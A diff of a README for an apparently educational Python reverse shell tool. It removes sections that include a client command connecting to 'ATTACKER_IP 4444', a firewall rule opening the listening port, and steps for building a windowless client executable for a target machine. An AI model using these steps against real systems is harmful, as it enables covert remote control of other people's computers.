@@ -2,7 +2,7 @@
 
 A Python-based reverse shell implementation that allows remote command execution over a network connection.
 
-## ⚠️ **DISCLAIMER & LEGAL WARNING**
+## **DISCLAIMER & LEGAL WARNING**
 
 **THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY.**
 
@@ -13,15 +13,7 @@ A Python-based reverse shell implementation that allows remote command execution
 
 By using this tool, you agree that you are solely responsible for how it is used.
 
-## 📋 **Features**
-
-- **Cross-platform**: Works on Windows, Linux, and macOS
-- **Persistent Connection**: Auto-reconnects if connection drops
-- **Command Execution**: Full shell command execution with output redirection
-- **Multiple IP Support**: Automatically detects and uses available network interfaces
-- **Simple Setup**: Only requires Python on both machines (no external dependencies)
-
-## 🏗️ **Project Structure**
+## **Project Structure**
 
 ```
 reverse-shell/
@@ -135,30 +127,7 @@ shell> exit            # Close connection
 | **Local Testing** | Use `127.0.0.1` or `localhost` |
 | **Over Internet** | Requires port forwarding and public IP |
 
-## 🔒 **Security & Firewall Configuration**
-
-### **Allow Port Through Firewall**
-
-**Windows Firewall:**
-```cmd
-# Open Command Prompt as Administrator
-netsh advfirewall firewall add rule name="Reverse Shell" dir=in action=allow protocol=TCP localport=9001
-```
-
-**Linux Firewall:**
-```bash
-sudo ufw allow 9001/tcp
-```
-
-### **Encryption Warning**
-⚠️ **This tool sends data in plaintext!**
-- Commands and output are not encrypted
-- Use only on trusted, isolated networks
-- For sensitive environments, consider adding SSL/TLS
-
-## 🛠️ **Troubleshooting**
-
-### **Common Issues & Solutions**
+## **Troubleshooting**
 
 1. **"Connection refused"**
    - Make sure server is running: `python server.py YOUR_IP`
@@ -195,41 +164,6 @@ python server.py 127.0.0.1
 python client.py 127.0.0.1
 ```
 
-## 🧪 **Advanced Usage**
-
-### **Custom Ports**
-```bash
-# Server on custom port
-python server.py YOUR_IP 4444
-
-# Client connecting to custom port
-python client.py ATTACKER_IP 4444
-```
-
-### **Finding All Available IPs**
-Create a `find_ip.py` script:
-```python
-import socket
-hostname = socket.gethostname()
-local_ip = socket.gethostbyname(hostname)
-print(f"Your IP address: {local_ip}")
-```
-
-### **Building Standalone Executables**
-Create executables so target doesn't need Python:
-
-```bash
-# Install PyInstaller
-pip install pyinstaller
-
-# Build client executable
-pyinstaller --onefile --noconsole client.py
-
-# Executable will be in dist/ folder
-```
-
-## 📚 **How It Works**
-
 ### **Technical Overview**
 1. **Server** binds to a port and listens for incoming connections
 2. **Client** connects to the server's IP and port
@@ -239,31 +173,17 @@ pyinstaller --onefile --noconsole client.py
    - Client sends output back to server
    - Server displays output to user
 
-### **Key Features**
+### **Features**
 - **Auto-reconnect**: Client reconnects automatically if connection drops
 - **Platform detection**: Uses correct shell for Windows/Linux
 - **Timeout handling**: Commands timeout after 30 seconds
 - **Error recovery**: Graceful handling of connection issues
 
-## 🤝 **Contributing**
-
-Found a bug or have a feature request?
-1. Check existing issues
-2. Fork the repository
-3. Create a feature branch
-4. Submit a pull request
-
-### **Planned Features**
-- [ ] SSL/TLS encryption
-- [ ] File transfer capabilities
-- [ ] Multiple client support
-- [ ] Web-based interface
-
 ## 📄 **License**
 
 This project is for educational purposes only. Users are solely responsible for complying with all applicable laws.
 
-## ❓ **FAQ**
+## **FAQ**
 
 **Q: How do I find my IP address?**
 A: Run `ipconfig` on Windows or `ifconfig` on Linux/Mac. Look for IPv4 address.
@@ -279,14 +199,6 @@ A: Type `exit` on server, or Ctrl+C on both ends.
 
 **Q: Why use port 9001?**
 A: It's a common non-standard port. You can use any available port (4444, 8080, etc.).
-
-## 🆘 **Support**
-
-For issues:
-1. Check the troubleshooting section above
-2. Test with localhost first
-3. Ensure correct IP addresses are used
-4. Check firewall settings
 
 ---
 
